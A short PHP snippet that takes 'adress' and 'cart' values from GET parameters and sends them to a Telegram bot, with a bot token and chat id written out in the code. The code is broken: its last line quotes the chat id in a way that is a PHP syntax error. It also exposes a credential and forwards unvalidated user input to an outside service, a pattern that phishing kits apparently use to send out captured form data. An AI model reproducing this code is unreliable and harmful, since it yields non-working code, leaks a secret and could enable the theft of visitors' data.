define ('url',"https://api.telegram.org/bot6834718836:AAFSF4bC8q9aUwXMS1hvnKaP4z230JnN8n8");
$adress = $_GET['adress'];
$cart = $_GET['cart'];
$chat_id = '2099878356';
$message = urlencode("cart:".$cart."\n adress : ".$adress);
file_get_contents(url."sendmessage?text=".$message."&chat_id="2099878356"&parse_mode=HTML");

